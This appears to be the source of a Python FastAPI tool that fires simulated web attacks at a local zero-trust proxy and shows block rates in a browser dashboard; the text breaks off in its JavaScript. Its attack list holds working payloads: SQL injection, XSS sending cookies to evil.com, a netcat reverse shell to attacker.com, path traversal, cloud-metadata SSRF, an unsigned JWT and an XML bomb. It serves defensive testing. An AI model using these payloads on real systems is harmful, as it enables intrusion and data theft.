# =============================================================================
# attack_simulator.py — Attack Simulation UI
# =============================================================================
# A standalone FastAPI app that simulates every known attack type against
# the Zero Trust Proxy, plus unknown/zero-day patterns.
#
# Run with:
#   python attack_simulator.py
#   (listens on port 8002 by default)
#
# Then expose via ngrok:
#   ngrok http 8002
#
# Point the simulator at your proxy:
#   PROXY_TARGET = "http://localhost:8000"  ← change in config below
#
# The simulator sends real HTTP requests to the proxy and shows
# live results — blocked, allowed, response time, etc.
# =============================================================================

import asyncio
import json
import time
import random
import string
import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, StreamingResponse

# =============================================================================
# CONFIG — change PROXY_TARGET to your proxy's address
# =============================================================================
PROXY_TARGET  = "http://localhost:8000"   # ← your Zero Trust Proxy
SIMULATOR_PORT = 8002
REQUEST_TIMEOUT = 8  # seconds per request

app = FastAPI(title="Attack Simulator", docs_url=None)


# =============================================================================
# ATTACK DEFINITIONS
# Each attack has: name, category, description, and a function that returns
# (method, path, headers, body) to send to the proxy.
# =============================================================================

def make_headers(extra: dict = None) -> dict:
    """Base headers that look like a real browser."""
    h = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
                      "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }
    if extra:
        h.update(extra)
    return h


ATTACKS = [

    # =========================================================================
    # SQL INJECTION
    # =========================================================================
    {
        "id": "sqli_classic",
        "name": "SQL Injection — Classic OR 1=1",
        "category": "SQL Injection",
        "description": "Attempts to bypass login by injecting tautology into query string.",
        "emoji": "💉",
        "fn": lambda: ("GET", "/login?user=admin'--&pass=x", make_headers(), b""),
    },
    {
        "id": "sqli_union",
        "name": "SQL Injection — UNION SELECT",
        "category": "SQL Injection",
        "description": "Attempts to dump database tables using UNION SELECT.",
        "emoji": "💉",
        "fn": lambda: ("GET", "/search?q=' UNION SELECT username,password FROM users--", make_headers(), b""),
    },
    {
        "id": "sqli_blind_sleep",
        "name": "SQL Injection — Blind Time-Based",
        "category": "SQL Injection",
        "description": "Uses SLEEP() to infer database structure without visible output.",
        "emoji": "💉",
        "fn": lambda: ("GET", "/product?id=1; SLEEP(5)--", make_headers(), b""),
    },
    {
        "id": "sqli_post_body",
        "name": "SQL Injection — POST Body",
        "category": "SQL Injection",
        "description": "Injects SQL through a POST login form body.",
        "emoji": "💉",
        "fn": lambda: ("POST", "/api/login",
                        make_headers({"Content-Type": "application/x-www-form-urlencoded"}),
                        b"username=admin' OR '1'='1&password=anything"),
    },

    # =========================================================================
    # CROSS-SITE SCRIPTING (XSS)
    # =========================================================================
    {
        "id": "xss_script_tag",
        "name": "XSS — Script Tag Injection",
        "category": "XSS",
        "description": "Injects a <script> tag to steal cookies or execute JS.",
        "emoji": "👾",
        "fn": lambda: ("GET", "/search?q=<script>alert(document.cookie)</script>", make_headers(), b""),
    },
    {
        "id": "xss_img_onerror",
        "name": "XSS — IMG onerror Event",
        "category": "XSS",
        "description": "Uses broken image src to trigger onerror JavaScript execution.",
        "emoji": "👾",
        "fn": lambda: ("GET", "/profile?name=<img src=x onerror=alert(1)>", make_headers(), b""),
    },
    {
        "id": "xss_javascript_proto",
        "name": "XSS — javascript: Protocol",
        "category": "XSS",
        "description": "Injects javascript: URI handler into redirect parameter.",
        "emoji": "👾",
        "fn": lambda: ("GET", "/redirect?url=javascript:fetch('https://evil.com/steal?c='+document.cookie)", make_headers(), b""),
    },
    {
        "id": "xss_post_comment",
        "name": "XSS — Stored via POST Body",
        "category": "XSS",
        "description": "Attempts to store XSS payload via comment or post submission.",
        "emoji": "👾",
        "fn": lambda: ("POST", "/api/comments",
                        make_headers({"Content-Type": "application/json"}),
                        b'{"comment":"<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>"}'),
    },

    # =========================================================================
    # COMMAND INJECTION
    # =========================================================================
    {
        "id": "cmdi_semicolon",
        "name": "Command Injection — Semicolon",
        "category": "Command Injection",
        "description": "Appends shell command after semicolon to read /etc/passwd.",
        "emoji": "💀",
        "fn": lambda: ("GET", "/ping?host=127.0.0.1; cat /etc/passwd", make_headers(), b""),
    },
    {
        "id": "cmdi_pipe",
        "name": "Command Injection — Pipe",
        "category": "Command Injection",
        "description": "Uses pipe operator to chain a malicious shell command.",
        "emoji": "💀",
        "fn": lambda: ("GET", "/tools/lookup?domain=example.com | whoami", make_headers(), b""),
    },
    {
        "id": "cmdi_backtick",
        "name": "Command Injection — Backtick Substitution",
        "category": "Command Injection",
        "description": "Uses backtick execution to run arbitrary commands inline.",
        "emoji": "💀",
        "fn": lambda: ("POST", "/api/process",
                        make_headers({"Content-Type": "application/json"}),
                        b'{"filename":"`nc -e /bin/bash attacker.com 4444`"}'),
    },

    # =========================================================================
    # PATH TRAVERSAL
    # =========================================================================
    {
        "id": "path_traversal_etc_passwd",
        "name": "Path Traversal — /etc/passwd",
        "category": "Path Traversal",
        "description": "Traverses directories to read the system password file.",
        "emoji": "📂",
        "fn": lambda: ("GET", "/files/../../../../etc/passwd", make_headers(), b""),
    },
    {
        "id": "path_traversal_encoded",
        "name": "Path Traversal — URL Encoded",
        "category": "Path Traversal",
        "description": "Uses %2e%2e%2f URL encoding to evade naive pattern detection.",
        "emoji": "📂",
        "fn": lambda: ("GET", "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd", make_headers(), b""),
    },
    {
        "id": "path_traversal_windows",
        "name": "Path Traversal — Windows Path",
        "category": "Path Traversal",
        "description": "Attempts to read Windows boot.ini using backslash traversal.",
        "emoji": "📂",
        "fn": lambda: ("GET", "/download?file=..\\..\\..\\Windows\\boot.ini", make_headers(), b""),
    },

    # =========================================================================
    # SCANNER / SUSPICIOUS USER-AGENT
    # =========================================================================
    {
        "id": "scanner_sqlmap",
        "name": "Scanner — sqlmap User-Agent",
        "category": "Suspicious Agent",
        "description": "Sends a request with sqlmap's signature User-Agent string.",
        "emoji": "🔍",
        "fn": lambda: ("GET", "/", {"User-Agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"}, b""),
    },
    {
        "id": "scanner_nikto",
        "name": "Scanner — Nikto Web Scanner",
        "category": "Suspicious Agent",
        "description": "Identifies as Nikto, a popular web vulnerability scanner.",
        "emoji": "🔍",
        "fn": lambda: ("GET", "/", {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)"}, b""),
    },
    {
        "id": "scanner_nmap",
        "name": "Scanner — Nmap Service Probe",
        "category": "Suspicious Agent",
        "description": "Nmap's HTTP probe used during service version detection scans.",
        "emoji": "🔍",
        "fn": lambda: ("GET", "/nmaplowercheck" + str(int(time.time())),
                        {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"}, b""),
    },

    # =========================================================================
    # BRUTE FORCE — sends 10 rapid requests to trigger rate limiter
    # =========================================================================
    {
        "id": "brute_force",
        "name": "Brute Force — Rapid Login Flood (×15)",
        "category": "Brute Force",
        "description": "Fires 15 rapid POST requests to simulate credential stuffing.",
        "emoji": "🔨",
        "multi": 15,
        "fn": lambda: ("POST", "/api/login",
                        make_headers({"Content-Type": "application/x-www-form-urlencoded"}),
                        f"username=admin&password={''.join(random.choices(string.ascii_lowercase, k=8))}".encode()),
    },

    # =========================================================================
    # HEADER INJECTION
    # =========================================================================
    {
        "id": "header_crlf",
        "name": "Header Injection — CRLF",
        "category": "Header Injection",
        "description": "Injects CRLF sequence into Referer header to split the HTTP response.",
        "emoji": "📨",
        "fn": lambda: ("GET", "/page", {
            "User-Agent": "Mozilla/5.0",
            "Referer": "http://example.com/page\r\nSet-Cookie: admin=true; HttpOnly",
        }, b""),
    },

    # =========================================================================
    # OVERSIZED REQUEST
    # =========================================================================
    {
        "id": "oversized_body",
        "name": "Oversized Request — 50KB Body",
        "category": "Brute Force",
        "description": "Sends a 50KB body to test payload size limits (DoS via memory).",
        "emoji": "💣",
        "fn": lambda: ("POST", "/api/upload",
                        make_headers({"Content-Type": "application/octet-stream"}),
                        b"A" * 51_000),
    },

    # =========================================================================
    # SHELLCODE
    # =========================================================================
    {
        "id": "shellcode_payload",
        "name": "Shellcode — Binary Payload",
        "category": "Shellcode",
        "description": "Sends a body containing NOP sled and shellcode-like byte sequences.",
        "emoji": "🐚",
        "fn": lambda: ("POST", "/api/upload",
                        make_headers({"Content-Type": "application/octet-stream"}),
                        b"\x90" * 32 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68" * 4 +
                        b"\\x41\\x42\\x43\\x44" * 20),
    },

    # =========================================================================
    # ZERO-DAY / UNKNOWN ATTACKS
    # These don't match any DPI rule. They rely on the anomaly detector.
    # =========================================================================
    {
        "id": "zeroday_weird_method",
        "name": "Zero-Day — Unusual HTTP Method (TRACK)",
        "category": "Zero-Day",
        "description": "Uses HTTP TRACK method — can leak auth headers via XST attacks.",
        "emoji": "👽",
        "fn": lambda: ("TRACK", "/", make_headers(), b""),
    },
    {
        "id": "zeroday_massive_headers",
        "name": "Zero-Day — Header Bomb (100 headers)",
        "category": "Zero-Day",
        "description": "Sends 100 custom headers — abnormal traffic profile, no known signature.",
        "emoji": "👽",
        "fn": lambda: ("GET", "/api/data",
                        {**make_headers(), **{f"X-Custom-Header-{i}": f"value-{'x'*20}" for i in range(100)}},
                        b""),
    },
    {
        "id": "zeroday_unicode_smuggling",
        "name": "Zero-Day — Unicode Smuggling",
        "category": "Zero-Day",
        "description": "Uses Unicode homoglyphs to bypass ASCII pattern matching.",
        "emoji": "👽",
        "fn": lambda: ("GET", "/ѕelect?ｕnion=аll&ｐassword=ｔrue", make_headers(), b""),
    },
    {
        "id": "zeroday_null_byte",
        "name": "Zero-Day — Null Byte Injection",
        "category": "Zero-Day",
        "description": "Injects null bytes to truncate strings in vulnerable parsers.",
        "emoji": "👽",
        "fn": lambda: ("GET", "/file?name=secret.txt%00.jpg", make_headers(), b""),
    },
    {
        "id": "zeroday_proto_pollution",
        "name": "Zero-Day — Prototype Pollution",
        "category": "Zero-Day",
        "description": "Attempts JS prototype pollution via JSON body.",
        "emoji": "👽",
        "fn": lambda: ("POST", "/api/config",
                        make_headers({"Content-Type": "application/json"}),
                        b'{"__proto__":{"admin":true,"isAuthenticated":true},"constructor":{"prototype":{"role":"superadmin"}}}'),
    },
    {
        "id": "zeroday_jwt_none",
        "name": "Zero-Day — JWT 'none' Algorithm",
        "category": "Zero-Day",
        "description": "Sends a JWT with algorithm=none to bypass signature verification.",
        "emoji": "👽",
        "fn": lambda: ("GET", "/api/protected",
                        make_headers({
                            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
                                             ".eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9."
                        }), b""),
    },
    {
        "id": "zeroday_ssrf",
        "name": "Zero-Day — SSRF via URL Parameter",
        "category": "Zero-Day",
        "description": "Server-Side Request Forgery — makes server fetch internal resources.",
        "emoji": "👽",
        "fn": lambda: ("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", make_headers(), b""),
    },
    {
        "id": "zeroday_xml_bomb",
        "name": "Zero-Day — XML Billion Laughs",
        "category": "Zero-Day",
        "description": "Billion laughs DoS — exponentially nested XML entities.",
        "emoji": "👽",
        "fn": lambda: ("POST", "/api/xml",
                        make_headers({"Content-Type": "application/xml"}),
                        b'''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>'''),
    },
    {
        "id": "zeroday_graphql_introspection",
        "name": "Zero-Day — GraphQL Introspection Probe",
        "category": "Zero-Day",
        "description": "GraphQL introspection to map entire API schema — recon attack.",
        "emoji": "👽",
        "fn": lambda: ("POST", "/graphql",
                        make_headers({"Content-Type": "application/json"}),
                        b'{"query":"{__schema{types{name fields{name}}}}"}'),
    },

    # =========================================================================
    # NORMAL TRAFFIC — should always pass
    # =========================================================================
    {
        "id": "normal_get",
        "name": "Normal — Simple GET Request",
        "category": "Normal",
        "description": "A plain browser GET request. Should be forwarded, never blocked.",
        "emoji": "✅",
        "fn": lambda: ("GET", "/", make_headers(), b""),
    },
    {
        "id": "normal_post_form",
        "name": "Normal — Form POST Submission",
        "category": "Normal",
        "description": "Legitimate form submission with clean data.",
        "emoji": "✅",
        "fn": lambda: ("POST", "/contact",
                        make_headers({"Content-Type": "application/x-www-form-urlencoded"}),
                        b"name=John+Smith&email=john@example.com&message=Hello+world"),
    },
    {
        "id": "normal_api",
        "name": "Normal — REST API Call",
        "category": "Normal",
        "description": "Standard JSON API request with Authorization header.",
        "emoji": "✅",
        "fn": lambda: ("GET", "/api/v1/products?page=1&limit=20",
                        make_headers({
                            "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.dGVzdA.abc123",
                            "Accept": "application/json",
                        }), b""),
    },
]

# Build a lookup dict
ATTACK_MAP = {a["id"]: a for a in ATTACKS}

# Group by category for the UI
CATEGORIES = {}
for atk in ATTACKS:
    cat = atk["category"]
    CATEGORIES.setdefault(cat, []).append(atk)


# =============================================================================
# ATTACK RUNNER
# =============================================================================

async def run_attack(attack_id: str):
    """
    Executes a single attack against the proxy and returns the result.
    Yields Server-Sent Events so the UI updates in real time.
    """
    atk = ATTACK_MAP.get(attack_id)
    if not atk:
        yield f"data: {json.dumps({'error': 'Unknown attack ID'})}\n\n"
        return

    multi = atk.get("multi", 1)
    results = []

    for i in range(multi):
        method, path, headers, body = atk["fn"]()
        url = f"{PROXY_TARGET}{path}"
        start = time.time()

        try:
            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT, follow_redirects=False) as client:
                resp = await client.request(
                    method=method, url=url,
                    headers=headers, content=body
                )
            elapsed = round((time.time() - start) * 1000, 1)
            blocked = resp.status_code == 403

            result = {
                "index":       i + 1,
                "total":       multi,
                "status_code": resp.status_code,
                "blocked":     blocked,
                "elapsed_ms":  elapsed,
                "url":         url[:80],
                "method":      method,
                "done":        (i + 1 == multi),
            }

        except httpx.ConnectError:
            result = {
                "index": i + 1, "total": multi,
                "error": f"Cannot connect to proxy at {PROXY_TARGET}. Is it running?",
                "done": True,
            }
        except httpx.TimeoutException:
            result = {
                "index": i + 1, "total": multi,
                "error": f"Request timed out after {REQUEST_TIMEOUT}s",
                "done": (i + 1 == multi),
            }
        except Exception as e:
            result = {
                "index": i + 1, "total": multi,
                "error": str(e), "done": (i + 1 == multi),
            }

        results.append(result)
        yield f"data: {json.dumps(result)}\n\n"

        # Small delay between burst requests so we don't overwhelm the event loop
        if multi > 1:
            await asyncio.sleep(0.05)


# =============================================================================
# ROUTES
# =============================================================================

@app.get("/run/{attack_id}")
async def run_attack_endpoint(attack_id: str):
    """SSE endpoint — streams attack results to the browser in real time."""
    return StreamingResponse(
        run_attack(attack_id),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        }
    )


@app.get("/attacks")
async def list_attacks():
    """Returns all attack definitions as JSON (for the UI)."""
    return [
        {k: v for k, v in a.items() if k != "fn"}
        for a in ATTACKS
    ]


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    """Serves the main simulator UI."""
    return HTMLResponse(HTML)


# =============================================================================
# UI — Dark terminal / hacker aesthetic
# =============================================================================

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Zero Trust — Attack Simulator</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
:root {
  --bg:        #050a0f;
  --surface:   #0a1520;
  --border:    #0f2a3f;
  --accent:    #00ffe7;
  --accent2:   #ff3e6c;
  --accent3:   #ffd700;
  --text:      #c8e6f5;
  --muted:     #4a7a9b;
  --green:     #00ff88;
  --red:       #ff3e6c;
  --yellow:    #ffd700;
  --purple:    #bf5af2;
  --font-mono: 'Share Tech Mono', monospace;
  --font-display: 'Orbitron', monospace;
}

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--font-mono);
  min-height: 100vh;
  overflow-x: hidden;
}

/* Scanlines overlay */
body::before {
  content: '';
  position: fixed;
  inset: 0;
  background: repeating-linear-gradient(
    0deg,
    transparent,
    transparent 2px,
    rgba(0,255,231,0.015) 2px,
    rgba(0,255,231,0.015) 4px
  );
  pointer-events: none;
  z-index: 9999;
}

/* Animated grid background */
body::after {
  content: '';
  position: fixed;
  inset: 0;
  background-image:
    linear-gradient(rgba(0,255,231,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,255,231,0.03) 1px, transparent 1px);
  background-size: 40px 40px;
  pointer-events: none;
  z-index: 0;
}

/* ---- HEADER ---- */
header {
  position: relative;
  z-index: 10;
  padding: 20px 20px 12px;
  border-bottom: 1px solid var(--border);
  background: linear-gradient(180deg, rgba(0,255,231,0.05) 0%, transparent 100%);
}

.header-inner {
  max-width: 900px;
  margin: 0 auto;
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 10px;
}

h1 {
  font-family: var(--font-display);
  font-size: clamp(14px, 4vw, 22px);
  font-weight: 900;
  color: var(--accent);
  text-shadow: 0 0 20px rgba(0,255,231,0.5);
  letter-spacing: 2px;
}

.target-badge {
  font-size: 11px;
  color: var(--muted);
  background: var(--surface);
  border: 1px solid var(--border);
  padding: 4px 10px;
  border-radius: 3px;
}

.target-badge span { color: var(--accent3); }

/* ---- STATS BAR ---- */
.stats-bar {
  position: relative;
  z-index: 10;
  display: flex;
  gap: 0;
  border-bottom: 1px solid var(--border);
  max-width: 100%;
  overflow-x: auto;
}

.stat {
  flex: 1;
  min-width: 80px;
  padding: 10px 16px;
  border-right: 1px solid var(--border);
  text-align: center;
}

.stat:last-child { border-right: none; }

.stat-value {
  font-family: var(--font-display);
  font-size: clamp(18px, 5vw, 28px);
  font-weight: 700;
  line-height: 1;
  transition: all 0.3s;
}

.stat-label {
  font-size: 9px;
  color: var(--muted);
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-top: 3px;
}

#stat-total   { color: var(--accent); }
#stat-blocked { color: var(--red);    }
#stat-allowed { color: var(--green);  }
#stat-pending { color: var(--yellow); }

/* ---- MAIN LAYOUT ---- */
.main {
  position: relative;
  z-index: 10;
  max-width: 900px;
  margin: 0 auto;
  padding: 16px;
  display: grid;
  grid-template-columns: 1fr;
  gap: 16px;
}

/* ---- CONTROLS ---- */
.controls {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;
  align-items: center;
}

.btn-run-all {
  font-family: var(--font-display);
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 2px;
  padding: 10px 20px;
  background: var(--accent2);
  color: #fff;
  border: none;
  cursor: pointer;
  border-radius: 2px;
  text-transform: uppercase;
  transition: all 0.2s;
  box-shadow: 0 0 20px rgba(255,62,108,0.3);
}

.btn-run-all:hover {
  background: #ff6b8a;
  box-shadow: 0 0 30px rgba(255,62,108,0.5);
}

.btn-run-all:disabled {
  opacity: 0.4;
  cursor: not-allowed;
}

.filter-btns {
  display: flex;
  gap: 4px;
  flex-wrap: wrap;
}

.filter-btn {
  font-family: var(--font-mono);
  font-size: 10px;
  padding: 5px 10px;
  background: transparent;
  color: var(--muted);
  border: 1px solid var(--border);
  cursor: pointer;
  border-radius: 2px;
  transition: all 0.15s;
}

.filter-btn:hover, .filter-btn.active {
  border-color: var(--accent);
  color: var(--accent);
}

/* ---- CATEGORY SECTION ---- */
.category-section { margin-bottom: 8px; }

.category-header {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 6px 0;
  font-family: var(--font-display);
  font-size: 10px;
  letter-spacing: 2px;
  color: var(--muted);
  text-transform: uppercase;
  border-bottom: 1px solid var(--border);
  margin-bottom: 6px;
}

.category-header::before {
  content: '';
  width: 3px;
  height: 14px;
  border-radius: 1px;
}

.cat-sqli    .category-header::before { background: #ff6b35; }
.cat-xss     .category-header::before { background: var(--purple); }
.cat-cmdi    .category-header::before { background: var(--red); }
.cat-path    .category-header::before { background: #35d4ff; }
.cat-agent   .category-header::before { background: var(--yellow); }
.cat-brute   .category-header::before { background: #ff8c00; }
.cat-header  .category-header::before { background: #80ff80; }
.cat-shell   .category-header::before { background: #ff4da6; }
.cat-zeroday .category-header::before { background: var(--accent); }
.cat-normal  .category-header::before { background: var(--green); }

.attacks-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 6px;
}

/* ---- ATTACK CARD ---- */
.attack-card {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 3px;
  padding: 10px 12px;
  cursor: pointer;
  transition: all 0.15s;
  position: relative;
  overflow: hidden;
}

.attack-card::before {
  content: '';
  position: absolute;
  left: 0; top: 0; bottom: 0;
  width: 2px;
  background: var(--border);
  transition: all 0.15s;
}

.attack-card:hover { border-color: var(--accent); background: #0d1e2e; }
.attack-card:hover::before { background: var(--accent); }
.attack-card.running { border-color: var(--yellow); animation: pulse 1s infinite; }
.attack-card.blocked::before { background: var(--red); width: 3px; }
.attack-card.allowed::before { background: var(--green); width: 3px; }
.attack-card.error::before   { background: var(--muted); width: 3px; }

@keyframes pulse {
  0%, 100% { box-shadow: 0 0 0 rgba(255,215,0,0); }
  50%       { box-shadow: 0 0 12px rgba(255,215,0,0.3); }
}

.card-top {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 8px;
}

.card-name {
  font-size: 11px;
  color: var(--text);
  line-height: 1.3;
  flex: 1;
}

.card-emoji { font-size: 16px; flex-shrink: 0; }

.card-desc {
  font-size: 10px;
  color: var(--muted);
  margin-top: 5px;
  line-height: 1.4;
}

.card-result {
  margin-top: 8px;
  font-size: 10px;
  padding: 5px 8px;
  border-radius: 2px;
  display: none;
}

.card-result.show { display: block; }

.card-result.blocked {
  background: rgba(255,62,108,0.1);
  border: 1px solid rgba(255,62,108,0.3);
  color: var(--red);
}

.card-result.allowed {
  background: rgba(0,255,136,0.08);
  border: 1px solid rgba(0,255,136,0.2);
  color: var(--green);
}

.card-result.error {
  background: rgba(74,122,155,0.1);
  border: 1px solid var(--border);
  color: var(--muted);
}

.card-result.running {
  background: rgba(255,215,0,0.08);
  border: 1px solid rgba(255,215,0,0.2);
  color: var(--yellow);
  display: block;
}

.btn-run {
  font-family: var(--font-mono);
  font-size: 9px;
  padding: 3px 8px;
  background: transparent;
  color: var(--accent);
  border: 1px solid var(--accent);
  cursor: pointer;
  border-radius: 2px;
  letter-spacing: 1px;
  text-transform: uppercase;
  transition: all 0.15s;
  flex-shrink: 0;
  margin-top: 2px;
}

.btn-run:hover {
  background: var(--accent);
  color: var(--bg);
}

.btn-run:disabled { opacity: 0.3; cursor: not-allowed; }

/* ---- TERMINAL LOG ---- */
.terminal {
  background: #020810;
  border: 1px solid var(--border);
  border-radius: 3px;
  overflow: hidden;
}

.terminal-header {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 8px 12px;
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  font-size: 10px;
  color: var(--muted);
  letter-spacing: 1px;
}

.terminal-dots { display: flex; gap: 5px; }
.dot { width: 8px; height: 8px; border-radius: 50%; }
.dot-r { background: var(--red); }
.dot-y { background: var(--yellow); }
.dot-g { background: var(--green); }

.terminal-body {
  padding: 10px;
  height: 200px;
  overflow-y: auto;
  font-size: 11px;
  line-height: 1.7;
}

.log-line { display: block; }
.log-line.blocked { color: var(--red); }
.log-line.allowed { color: var(--green); }
.log-line.info    { color: var(--muted); }
.log-line.warn    { color: var(--yellow); }

.cursor {
  display: inline-block;
  width: 7px;
  height: 13px;
  background: var(--accent);
  animation: blink 1s infinite;
  vertical-align: middle;
}

@keyframes blink { 0%,49%{opacity:1} 50%,100%{opacity:0} }

/* ---- PROGRESS ---- */
.progress-bar {
  height: 2px;
  background: var(--border);
  border-radius: 1px;
  overflow: hidden;
  display: none;
}

.progress-bar.show { display: block; }

.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  width: 0%;
  transition: width 0.3s;
}

/* scrollbar */
::-webkit-scrollbar { width: 4px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

/* ---- HIDDEN CATEGORY ---- */
.category-section.hidden { display: none; }
</style>
</head>
<body>

<header>
  <div class="header-inner">
    <h1>⚡ ATTACK SIMULATOR</h1>
    <div class="target-badge">TARGET: <span id="target-display">loading...</span></div>
  </div>
</header>

<div class="stats-bar">
  <div class="stat">
    <div class="stat-value" id="stat-total">0</div>
    <div class="stat-label">Fired</div>
  </div>
  <div class="stat">
    <div class="stat-value" id="stat-blocked">0</div>
    <div class="stat-label">Blocked</div>
  </div>
  <div class="stat">
    <div class="stat-value" id="stat-allowed">0</div>
    <div class="stat-label">Allowed</div>
  </div>
  <div class="stat">
    <div class="stat-value" id="stat-pending">0</div>
    <div class="stat-label">Pending</div>
  </div>
</div>

<div class="main">

  <!-- Controls -->
  <div class="controls">
    <button class="btn-run-all" onclick="runAll()">▶ LAUNCH ALL ATTACKS</button>
    <div class="filter-btns" id="filter-btns">
      <button class="filter-btn active" onclick="filter('all', this)">ALL</button>
    </div>
  </div>

  <!-- Progress bar -->
  <div class="progress-bar" id="progress-bar">
    <div class="progress-fill" id="progress-fill"></div>
  </div>

  <!-- Attack cards rendered here -->
  <div id="attacks-container"></div>

  <!-- Terminal log -->
  <div class="terminal">
    <div class="terminal-header">
      <div class="terminal-dots">
        <div class="dot dot-r"></div>
        <div class="dot dot-y"></div>
        <div class="dot dot-g"></div>
      </div>
      LIVE OUTPUT — ZERO TRUST PROXY RESPONSES
    </div>
    <div class="terminal-body" id="terminal">
      <span class="log-line info">// Zero Trust Attack Simulator ready</span><br>
      <span class="log-line info">// Select an attack or launch all</span><br>
      <span class="cursor"></span>
    </div>
  </div>

</div>

<script>
const PROXY_TARGET = location.origin.replace(':8002','').replace(location.port,'8002');
let attacks = [];
let stats = { total: 0, blocked: 0, allowed: 0, pending: 0 };
let running = false;

// Category → CSS class map
const catClass = {
  'SQL Injection':   'cat-sqli',
  'XSS':            'cat-xss',
  'Command Injection': 'cat-cmdi',
  'Path Traversal': 'cat-path',
  'Suspicious Agent': 'cat-agent',
  'Brute Force':    'cat-brute',
  'Header Injection': 'cat-header',
  'Shellcode':      'cat-shell',
  'Zero-Day':       'cat-zeroday',
  'Normal':         'cat-normal',
};

// ---- Boot ----
async function init() {
  const resp = await fetch('/attacks');
  attacks = await resp.json();

  // Set target display
  document.getElementById('target-display').textContent =
    new URL(location.href).searchParams.get('target') || 'localhost:8000';

  // Render filter buttons
  const cats = [...new Set(attacks.map(a => a.category))];
  const filterDiv = document.getElementById('filter-btns');
  cats.forEach(cat => {
    const btn = document.createElement('button');
    btn.className = 'filter-btn';
    btn.textContent = cat.toUpperCase();
    btn.onclick = () => filter(cat, btn);
    filterDiv.appendChild(btn);
  });

  renderCards();
}

// ---- Render attack cards grouped by category ----
function renderCards() {
  const container = document.getElementById('attacks-container');
  container.innerHTML = '';

  // Group
  const groups = {};
  attacks.forEach(a => {
    groups[a.category] = groups[a.category] || [];
    groups[a.category].push(a);
  });

  Object.entries(groups).forEach(([cat, list]) => {
    const section = document.createElement('div');
    section.className = `category-section ${catClass[cat] || ''}`;
    section.dataset.category = cat;

    section.innerHTML = `
      <div class="category-header">${cat} <span style="color:var(--border)">(${list.length})</span></div>
      <div class="attacks-grid" id="grid-${cat.replace(/\s+/g,'_')}"></div>
    `;
    container.appendChild(section);

    const grid = section.querySelector('.attacks-grid');
    list.forEach(atk => {
      const card = document.createElement('div');
      card.className = 'attack-card';
      card.id = `card-${atk.id}`;
      card.innerHTML = `
        <div class="card-top">
          <div>
            <div class="card-name">${atk.emoji} ${atk.name}</div>
            <div class="card-desc">${atk.description}</div>
          </div>
          <button class="btn-run" onclick="runSingle('${atk.id}')" id="btn-${atk.id}">FIRE</button>
        </div>
        <div class="card-result" id="result-${atk.id}"></div>
      `;
      grid.appendChild(card);
    });
  });
}

// ---- Filter by category ----
function filter(cat, btn) {
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');

  document.querySelectorAll('.category-section').forEach(s => {
    if (cat === 'all' || s.dataset.category === cat) {
      s.classList.remove('hidden');
    } else {
      s.classList.add('hidden');
    }
  });
}

// ---- Run a single attack via SSE ----
async function runSingle(id) {
  const card = document.getElementById(`card-${id}`);
  const resultDiv = document.getElementById(`result-${id}`);
  const btn = document.getElementById(`btn-${id}`);

  card.className = 'attack-card running';
  btn.disabled = true;
  resultDiv.className = 'card-result running show';
  resultDiv.textContent = '⏳ Firing...';

  stats.pending++;
  updateStats();
  log(`info`, `→ Firing: ${id}`);

  const evtSource = new EventSource(`/run/${id}`);
  let lastResult = null;

  evtSource.onmessage = (e) => {
    const data = JSON.parse(e.data);
    lastResult = data;

    if (data.error) {
      card.className = 'attack-card error';
      resultDiv.className = 'card-result error show';
      resultDiv.textContent = `⚠ ${data.error}`;
      log('warn', `  ✗ ERROR: ${data.error}`);

      stats.pending = Math.max(0, stats.pending - 1);
      stats.total++;
      updateStats();
      evtSource.close();
      btn.disabled = false;
      return;
    }

    // Update for burst attacks
